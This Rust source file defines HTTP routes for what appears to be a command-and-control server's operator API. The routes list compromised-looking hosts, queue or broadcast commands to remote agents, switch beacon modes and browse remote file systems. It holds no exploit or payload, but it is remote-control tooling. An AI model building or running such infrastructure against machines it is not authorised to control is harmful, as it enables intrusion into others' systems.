// src/api/routes/hosts.rs
use axum::{
    extract::{Path, State, Query},
    http::StatusCode,
    response::{IntoResponse, Response},
    Json,
};
use std::sync::Arc;
use tokio::sync::oneshot;
use serde::Deserialize;

use crate::api::state::ApiContext;
use crate::api::models::{SessionDto, CommandRequest};
use crate::database;

#[derive(Deserialize)]
pub struct BrowseQuery {
    path: Option<String>,
}

pub async fn list_hosts(State(state): State<Arc<ApiContext>>) -> Json<Vec<SessionDto>> {
    let sessions = state.sessions.lock().unwrap();
    let proxies = state.proxies.lock().unwrap();
    
    let db = state.db.clone();
    
    let dtos: Vec<SessionDto> = sessions.iter().map(|(id, session)| {
        let (is_active, profile) = {
            if let Ok(conn) = db.get() {
                let active = database::is_session_active(&conn, *id);
                let prof = database::get_session_profile(&conn, *id);
                (active, prof)
            } else {
                (false, "unknown".to_string())
            }
        };

        SessionDto {
            id: *id,
            hostname: session.hostname.clone(),
            ip: session.addr.ip().to_string(),
            os: session.os.clone(),
            computer_id: session.computer_id.clone(),
            has_proxy: proxies.contains_key(id),
            parent_id: session.parent_id,
            is_active,
            profile, 
        }
    }).collect();

    Json(dtos)
}

pub async fn send_command(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
    Json(payload): Json<CommandRequest>,
) -> Response {
    
    // Intercept Beacon Mode commands to update DB state immediately
    if payload.command == "beacon:mode active" {
        if let Ok(conn) = state.db.get() {
            database::set_session_active(&conn, id, true);
        }
    } else if payload.command == "beacon:mode passive" {
        if let Ok(conn) = state.db.get() {
            database::set_session_active(&conn, id, false);
        }
    }

    let sender_option = {
        let sessions = state.sessions.lock().unwrap();
        sessions.get(&id).map(|s| s.tx.clone())
    };

    if let Some(tx_channel) = sender_option {
        let (cb_tx, cb_rx) = oneshot::channel::<u64>();
        
        match tx_channel.send((payload.command.clone(), Some(cb_tx))) {
            Ok(_) => {
                match cb_rx.await {
                    Ok(req_id) => (StatusCode::OK, Json(serde_json::json!({ "status": "queued", "session_id": id, "request_id": req_id }))).into_response(),
                    Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Callback dropped"}))).into_response(),
                }
            },
            Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Failed to send to channel"}))).into_response(),
        }
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session ID not found"}))).into_response()
    }
}

pub async fn get_output(
    State(state): State<Arc<ApiContext>>,
    Path((session_id, request_id)): Path<(u32, u64)>,
) -> Response {
    let results = state.results.lock().unwrap();
    if let Some(response) = results.get(&(session_id, request_id)) {
        (StatusCode::OK, Json(serde_json::json!({
            "status": "completed",
            "output": response.output,
            "error": response.error,
            "exit_code": response.exit_code
        }))).into_response()
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({ "status": "pending_or_not_found", "message": "Output not available yet or ID invalid" }))).into_response()
    }
}

pub async fn broadcast(
    State(state): State<Arc<ApiContext>>,
    Json(payload): Json<CommandRequest>,
) -> Response {
    let sessions = state.sessions.lock().unwrap();
    let mut count = 0;
    
    let db_inner = state.db.clone();
    let cmd_log = payload.command.clone();
    let active_ids: Vec<u32> = sessions.keys().cloned().collect();

    tokio::task::spawn_blocking(move || {
        if let Ok(conn) = db_inner.get() {
            for id in active_ids {
                let req_id = rand::random::<u64>();
                database::log_command(&conn, id, req_id, &cmd_log);
            }
        }
    });

    for session in sessions.values() {
        if session.tx.send((payload.command.clone(), None)).is_ok() { count += 1; }
    }
    (StatusCode::OK, Json(serde_json::json!({ "status": "broadcast_queued", "targets_reached": count }))).into_response()
}

// [NEW] Interactive File Browser Endpoint
pub async fn browse_files(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
    Query(query): Query<BrowseQuery>,
) -> Response {
    let path = query.path.unwrap_or_else(|| ".".to_string());
    let command = format!("fs:ls {}", path);

    let sender_option = {
        let sessions = state.sessions.lock().unwrap();
        sessions.get(&id).map(|s| s.tx.clone())
    };

    if let Some(tx_channel) = sender_option {
        let (cb_tx, cb_rx) = oneshot::channel::<u64>();
        
        // 1. Send Command to Agent
        match tx_channel.send((command, Some(cb_tx))) {
            Ok(_) => {
                // 2. Wait for Request ID
                let req_id = match cb_rx.await {
                    Ok(rid) => rid,
                    Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Failed to queue command"}))).into_response(),
                };

                // 3. Poll for result (Simple polling loop since this is interactive)
                // In production, use a Notify or Condvar, but polling is fine for MVP
                let start = std::time::Instant::now();
                loop {
                    if start.elapsed().as_secs() > 10 {
                        return (StatusCode::GATEWAY_TIMEOUT, Json(serde_json::json!({"error": "Timeout waiting for agent response"}))).into_response();
                    }

                    // Scope lock
                    {
                        let results = state.results.lock().unwrap();
                        if let Some(response) = results.get(&(id, req_id)) {
                            // If Agent returned error in output
                            if !response.error.is_empty() {
                                return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": response.error}))).into_response();
                            }
                            
                            // Parse JSON from output
                            let json_res: serde_json::Value = match serde_json::from_str(&response.output) {
                                Ok(j) => j,
                                Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Invalid JSON from agent", "raw": response.output}))).into_response(),
                            };
                            
                            return (StatusCode::OK, Json(json_res)).into_response();
                        }
                    }
                    tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
                }
            },
            Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Agent disconnected"}))).into_response(),
        }
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session offline"}))).into_response()
    }
}
